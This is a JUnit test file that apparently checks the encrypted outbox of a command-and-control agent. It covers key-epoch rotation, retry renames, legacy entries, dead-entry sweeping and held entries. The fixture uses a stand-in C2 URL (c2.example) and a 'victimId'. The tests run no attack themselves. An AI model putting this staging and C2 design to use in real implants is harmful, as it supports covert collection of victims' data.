package com.spcagentpayloa.jvmxx.crypto;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Epoch-tagged entries must open after a rotation and never be silent. */
class OutboxTest {
	@TempDir
	Path temp;

	private CryptoConfig config(int scheme) {
		Map<String, Object> map = new LinkedHashMap<>();
		map.put("build_id", "00000000-0000-4000-8000-000000000001");
		map.put("build_secret", Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32)));
		map.put("c2_base", "https://c2.example/api/v1");
		map.put("artifact_scheme", (long) scheme);
		CryptoConfig config = new CryptoConfig(map);
		config.victimId("00000000-0000-4000-8000-000000000002");
		return config;
	}

	private String salt() {
		return Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32));
	}

	private Path first(Path dir) throws Exception {
		try (var stream = Files.list(dir)) {
			return stream.filter(Files::isRegularFile).findFirst().orElseThrow();
		}
	}

	@Test
	void entriesCarryTheEpochAndOpenAfterRotation() throws Exception {
		CryptoConfig config = config(2);
		config.keySalt(1, salt());
		Outbox outbox = new Outbox(temp, config, null, null);
		Path dir = temp.resolve("cache").resolve("outbox");

		outbox.enqueue("00000000-0000-4000-8000-000000000010", "one".getBytes(StandardCharsets.UTF_8));
		Path old = first(dir);
		assertTrue(old.getFileName().toString().contains("-e1-"));
		byte[] one = Files.readAllBytes(old);
		assertArrayEquals("SPCB2".getBytes(StandardCharsets.US_ASCII), java.util.Arrays.copyOf(one, 5));

		config.keySalt(2, salt());
		assertArrayEquals("one".getBytes(StandardCharsets.UTF_8), outbox.read(old));
		outbox.enqueue("00000000-0000-4000-8000-000000000011", "two".getBytes(StandardCharsets.UTF_8));
		assertTrue(first(dir).getFileName().toString().contains("-e2-"));

		// A fourth epoch evicts epoch 1; the entry then reports unknown_epoch.
		config.keySalt(3, salt());
		config.keySalt(4, salt());
		assertEquals(List.of(2, 3, 4), config.epochs());
		try {
			outbox.read(old);
			throw new AssertionError("epoch 1 should be evicted");
		} catch (IllegalStateException expected) {
			assertEquals("key_epoch_unknown", expected.getMessage());
		}
	}

	@Test
	void retryRenameKeepsTheEntryReadable() throws Exception {
		CryptoConfig config = config(2);
		config.keySalt(1, salt());
		Outbox outbox = new Outbox(temp, config, null, null);
		Path dir = temp.resolve("cache").resolve("outbox");
		outbox.enqueue("00000000-0000-4000-8000-000000000010", "retry".getBytes(StandardCharsets.UTF_8));

		Path file = first(dir);
		String renamed = file.getFileName().toString().replaceFirst("-\\d+-e", "-1-e");
		Path retried = file.resolveSibling(renamed);
		Files.move(file, retried);

		assertArrayEquals("retry".getBytes(StandardCharsets.UTF_8), outbox.read(retried));
	}

	@Test
	void legacySchemeOneEntriesStillOpen() throws Exception {
		CryptoConfig config = config(1);
		Outbox outbox = new Outbox(temp, config, null, null);
		outbox.enqueue("00000000-0000-4000-8000-000000000010", "legacy".getBytes(StandardCharsets.UTF_8));
		Path file = first(temp.resolve("cache").resolve("outbox"));
		assertArrayEquals("legacy".getBytes(StandardCharsets.UTF_8), outbox.read(file));
	}

	@Test
	void legacyEntrySurvivesTheRetryRename() throws Exception {
		CryptoConfig config = config(1);
		Outbox outbox = new Outbox(temp, config, null, null);
		outbox.enqueue("00000000-0000-4000-8000-000000000010", "legacy".getBytes(StandardCharsets.UTF_8));
		Path file = first(temp.resolve("cache").resolve("outbox"));

		Path retried = file.resolveSibling(file.getFileName().toString().replaceFirst("-\\d+-e", "-2-e"));
		Files.move(file, retried);

		assertArrayEquals("legacy".getBytes(StandardCharsets.UTF_8), outbox.read(retried));
	}

	@Test
	void oldDeadEntriesAreSwept() throws Exception {
		Path dead = temp.resolve("cache").resolve("outbox").resolve("dead");
		Files.createDirectories(dead);
		Path old = dead.resolve("0000000000001-0-e1-old.bin");
		Files.write(old, new byte[] { 1 });
		Files.setLastModifiedTime(old, java.nio.file.attribute.FileTime.fromMillis(
			System.currentTimeMillis() - 31L * 24L * 3_600_000L));

		new Outbox(temp, config(2), null, null);

		assertTrue(Files.notExists(old), "dead entries expire after 30 days");
	}

	@Test
	void aHeldEntrySurvivesAndComesBack() throws Exception {
		CryptoConfig config = config(2);
		config.keySalt(1, salt());
		Outbox outbox = new Outbox(temp, config, null, null);
		Path dir = temp.resolve("cache").resolve("outbox");
		outbox.enqueue("00000000-0000-4000-8000-000000000010", "held".getBytes(StandardCharsets.UTF_8));
		outbox.holdAll();
		assertEquals(0, outbox.size());
		outbox.releaseHeld();
		assertEquals(1, outbox.size());
		assertNotNull(first(dir));
	}
}
